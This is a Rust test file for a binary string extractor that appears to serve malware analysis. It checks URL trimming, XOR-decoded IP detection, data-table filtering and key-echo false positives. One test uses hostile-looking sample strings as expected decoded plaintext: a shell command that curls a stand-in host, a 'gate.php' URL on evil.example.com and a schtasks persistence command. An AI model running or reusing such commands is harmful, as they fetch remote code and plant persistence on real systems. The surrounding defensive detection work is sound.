use super::clean_url_trailing_garbage;
use crate::xor::autodetect::value_is_key_echo;
use crate::xor::expand::{extract_ip_at_dot, looks_like_data_table};

#[test]
fn clean_url_trailing_garbage_handles_multibyte_domain_url() {
    assert_eq!(
        clean_url_trailing_garbage("http://hackers.Tv/indexяhph,l1Ĉ"),
        "http://hackers.Tv/indexяhph,l1Ĉ"
    );
}

#[test]
fn clean_url_trailing_garbage_trims_after_multibyte_domain_url() {
    assert_eq!(
        clean_url_trailing_garbage("http://hackers.Tv/indexяhph,l1Ĉ!@"),
        "http://hackers.Tv/indexяhph,l1Ĉ"
    );
}

#[test]
fn clean_url_trailing_garbage_handles_ip_port_before_multibyte_suffix() {
    assert_eq!(
        clean_url_trailing_garbage("http://46.30.191.141:8080Ĉgarbage"),
        "http://46.30.191.141:8080"
    );
}

// Place the 9 raw bytes that XOR-decode to "32.93.2.3" under key 0x33
// (0x00 0x01 0x1d 0x0a 0x00 0x1d 0x01 0x1d 0x00) inside a window filled
// with other small integers — the shape of sqlite3's VDBE opcode or
// B-tree index tables. The extracted "IP" passes is_valid_ip but the
// surrounding region is clearly a data table, not ciphertext.
fn low_byte_table_with_ip_pattern() -> (Vec<u8>, usize) {
    let mut data = vec![
        0x02, 0x00, 0x0c, 0x04, 0x00, 0x05, 0x01, 0x0a, 0x00, 0x08, 0x00, 0x03, 0x07, 0x01, 0x0f,
        0x00, 0x02, 0x00, 0x0c, 0x04, 0x00, 0x05, 0x01, 0x0a, 0x00, 0x08, 0x00, 0x03, 0x07, 0x01,
        0x0f, 0x00,
    ];
    let ip_offset = data.len();
    data.extend_from_slice(&[0x00, 0x01, 0x1d, 0x0a, 0x00, 0x1d, 0x01, 0x1d, 0x00]);
    data.extend_from_slice(&[
        0x02, 0x00, 0x0c, 0x04, 0x00, 0x05, 0x01, 0x0a, 0x00, 0x08, 0x00, 0x03, 0x07, 0x01, 0x0f,
        0x00, 0x02, 0x00, 0x0c, 0x04, 0x00, 0x05, 0x01, 0x0a, 0x00, 0x08, 0x00, 0x03, 0x07, 0x01,
        0x0f, 0x00,
    ]);
    // The first '.' in the decoded IP sits two bytes in (index ip_offset + 2).
    (data, ip_offset + 2)
}

#[test]
fn data_table_context_rejects_spurious_ip() {
    let (data, dot_pos) = low_byte_table_with_ip_pattern();
    assert!(
        extract_ip_at_dot(&data, dot_pos, 0x33).is_none(),
        "IP-shaped match inside a low-byte data table must be rejected"
    );
}

#[test]
fn varied_context_preserves_real_ip() {
    // Same 9-byte raw pattern under key 0x33, but embedded in .rodata-like
    // bytes (printable strings, pointers): the neighborhood is varied, so
    // the match survives. This guards against the new filter over-rejecting.
    // Boundary byte 0x13 flanks the IP so the walk terminates cleanly
    // (0x13 ^ 0x33 = 0x20 space, not a digit/dot).
    let mut data: Vec<u8> = b"GET /index.html HTTP/1.1 Host example com ".to_vec();
    data.push(0x13);
    let ip_offset = data.len();
    data.extend_from_slice(&[0x00, 0x01, 0x1d, 0x0a, 0x00, 0x1d, 0x01, 0x1d, 0x00]);
    data.push(0x13);
    data.extend_from_slice(b" User-Agent Mozilla 5.0 Windows NT 10.0 trailing");
    let dot_pos = ip_offset + 2;
    let extracted = extract_ip_at_dot(&data, dot_pos, 0x33);
    assert_eq!(
        extracted.map(|(ip, _, _)| ip),
        Some("32.93.2.3".to_string()),
        "real XOR-encoded IP in varied context should still be extracted"
    );
}

#[test]
fn looks_like_data_table_thresholds() {
    // All-low-byte window: structured table.
    let low = vec![0x03u8; 64];
    assert!(looks_like_data_table(&low, 20, 29));

    // All-high-byte window: definitely not a table.
    let high = vec![0x80u8; 64];
    assert!(!looks_like_data_table(&high, 20, 29));

    // Mixed window (~12% low): random-looking ciphertext.
    let mut mixed = vec![0x55u8; 64];
    for i in (0..64).step_by(8) {
        mixed[i] = 0x03;
    }
    assert!(!looks_like_data_table(&mixed, 20, 29));

    // Tiny buffer: can't judge, don't reject.
    let tiny = vec![0x00u8; 8];
    assert!(!looks_like_data_table(&tiny, 0, 8));
}

#[test]
fn key_echo_flags_garbled_copies_of_key() {
    // Real reproduction: an OpenAPI schema repeating "OAuth2AuthorizationCode"
    // makes the scanner derive that token as a key; XORing smears "auth"/"code"
    // shards across the output. Those shards must be recognized as key echoes.
    let key = "\"oauth2authorizationcode\": {";
    for garbage in [
        "l 6w]d8authm",          // contains key shard "auth"
        "8tt1tm2authfxczatilnl", // contains "auth", "atil" shards
        "p*%rtj8authorizc#!*<",  // contains "authoriz" shard
        "i<aht38authoriz",
    ] {
        assert!(
            value_is_key_echo(garbage, key),
            "expected {garbage:?} to be flagged as an echo of {key:?}"
        );
    }
}

#[test]
fn key_echo_ignores_genuine_plaintext() {
    // A real key is high-entropy bytes; genuinely decoded plaintext shares no
    // alphanumeric window with it, so true positives must NOT be flagged.
    let key = "sup3rs3cr3tk3y!!".to_ascii_lowercase();
    for real in [
        "http://evil.example.com/gate.php",
        "/bin/sh -c 'curl http://1.2.3.4/x'",
        "schtasks /create /tn updater",
    ] {
        assert!(
            !value_is_key_echo(real, &key),
            "did not expect {real:?} to be flagged as an echo of {key:?}"
        );
    }
    // Punctuation/whitespace windows of the key must not match (we only key off
    // alphanumeric shards), and sub-window inputs are ignored.
    assert!(!value_is_key_echo("ab", "abcdef"));
    assert!(!value_is_key_echo("nothing in common", "\": { } ,"));
}

// End-to-end: a benign, text-rich buffer that repeats an "auth"-laden token
// must NOT yield a spurious auto-detected XOR key (and therefore no XOR
// strings). This is the authgent_server false positive in miniature.
#[test]
fn repetitive_auth_text_yields_no_xor_strings() {
    let mut data = String::new();
    for _ in 0..40 {
        data.push_str(
            "\"OAuth2AuthorizationCode\": { \"authorizationUrl\": \"/authorize\", \
                 \"tokenUrl\": \"/token\", \"scopes\": {} },\n",
        );
    }
    let opts = crate::ExtractOptions::new(6)
        .with_garbage_filter(true)
        .with_xor(None);
    let strings = crate::extract_strings_with_options(data.as_bytes(), &opts);
    let xor_count = strings
        .iter()
        .filter(|s| {
            matches!(
                s.method,
                crate::StringMethod::XorDecode | crate::StringMethod::XorStackPair
            )
        })
        .count();
    assert_eq!(
        xor_count, 0,
        "repetitive benign auth text must not auto-detect an XOR key"
    );
}
